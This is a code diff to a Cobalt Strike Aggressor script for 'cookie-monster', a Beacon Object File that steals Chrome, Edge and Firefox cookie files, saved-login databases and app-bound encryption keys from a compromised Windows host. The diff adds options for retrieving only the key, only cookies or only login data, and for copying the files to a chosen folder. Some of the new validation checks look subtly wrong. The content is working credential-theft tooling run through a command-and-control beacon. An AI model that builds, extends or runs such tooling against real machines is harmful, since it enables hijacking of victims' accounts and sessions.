@@ -9,10 +9,10 @@
 beacon_command_register(
 "cookie-monster",
 "Locate and copy the cookie file used for Edge/Chrome/Firefox",
-"Usage: cookie-monster [--chrome || --edge || --system <Local State File Path> <PID> || --firefox || --chromeCookiePID <PID> || --chromeLoginDataPID <PID> || --edgeCookiePID <PID> || --edgeLoginDataPID <PID> ] \
+"Usage: cookie-monster [--chrome || --edge || --system <Local State File Path> <PID> || --firefox || --chromeCookiePID <PID> || --chromeLoginDataPID <PID> || --edgeCookiePID <PID> || --edgeLoginDataPID <PID> ] [--cookie-only] [--key-only] [--login-data-only] [--copy-file C:\\Folder\\Location\\] \
 cookie-monster Example: \
    cookie-monster --chrome \
-   cookie-monster --edge \
+   cookie-monster --edge --key-only \
    cookie-monster --system \"C:\\Users\\<USER>\\AppData\\Local\\<BROWSER>\\User\ Data\\Local\ State\" <PID> \
    cookie-moster --firefox \
    cookie-monster --chromeCookiePID <PID> \
@@ -28,6 +28,10 @@ cookie-monster Options: \
     --chromeLoginDataPID, if chrome PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file \  
     --edgeCookiePID, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file \
     --edgeLoginDataPID, if edge PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file \ 
+    --key-only, only retrieve the app bound encryption key. Do not attempt to download the Cookie or Login Data files. \
+    --cookie-only, only retrieve the Cookie file. Do not attempt to download Login Data file or retrieve app bound encryption key. \
+    --login-data-only, only retrieve the Login Data file. Do not attempt to download Cookie file or retrieve app bound encryption key. \ 
+    --copy-file, copies the Cookie and Login Data file to the folder specified. Does not use fileless retrieval method. \ 
     ");
 
 # $1 - beacon id
@@ -57,7 +61,11 @@ alias cookie-monster {
     $edgeCookiePID = 0;
     $edgeLoginDataPID = 0;
     $pid = 0;
+    $cookieOnly = 0;
+    $loginDataOnly = 0;
+    $keyOnly = 0;
     $path = "";
+    $copyFile = "";
 
     for ($i = 1; $i < size(@_); $i++)
     {
@@ -167,6 +175,28 @@ alias cookie-monster {
                     return;
                 }
         }
+        else if (@_[$i] eq "--key-only")
+        {
+            $keyOnly = 1;
+        }
+        else if (@_[$i] eq "--cookie-only")
+        {
+            $cookieOnly = 1;
+        }
+        else if (@_[$i] eq "--login-data-only")
+        {
+            $loginDataOnly = 1;
+        }
+        else if (@_[$i] eq "--copy-file")
+        {
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing folder path to copy file to");
+                return;
+            }
+            $copyFile = @_[$i];
+        }
         else {
             berror($1, "NONE OF THE OPTIONS SELECTED");
             return;
@@ -177,8 +207,28 @@ alias cookie-monster {
         berror($1, "NO OPTIONS SELECTED");
         return;
     }
+
+    if ($keyOnly == 1 && ($cookieOnly == 1 || $loginDataOnly == 1)) {
+        berror($1, "--key-only cannot be used with --cookie-only or --login-data-only");
+        return;
+    }
+
+    if ($keyOnly == 1 && strlen($copyFile) > 0) {
+        berror($1, "--key-only cannot be used with --copy-file");
+        return;
+    }
+
+    if ($loginDataOnly == 1 && ($edgeCookiePID == 1 || $chromeCookiePID == 1)) {
+        berror($1, "--login-data-only cannot be used with --edgeCookiePID or --chromeCookiePID");
+        return;
+    }
+
+    if ($cookieOnly == 1 && ($edgeLoginDataPID == 1 || $chromeLoginDataPID == 1)) {
+        berror($1, "--login-data-only cannot be used with --edgeCookiePID or --chromeCookiePID");
+        return;
+    }
     
-    $args = bof_pack($1, "iiiiiiiiiz", $chrome, $edge, $system, $firefox, $chromeCookiePID, $chromeLoginDataPID, $edgeCookiePID, $edgeLoginDataPID, $pid, $path);
+    $args = bof_pack($1, "iiiiiiiiiziiiz", $chrome, $edge, $system, $firefox, $chromeCookiePID, $chromeLoginDataPID, $edgeCookiePID, $edgeLoginDataPID, $pid, $path, $keyOnly, $cookieOnly, $loginDataOnly, $copyFile);
     btask($1, "Running Cookie-Monster BOF");
     beacon_inline_execute($1, $data, "go", $args);
 
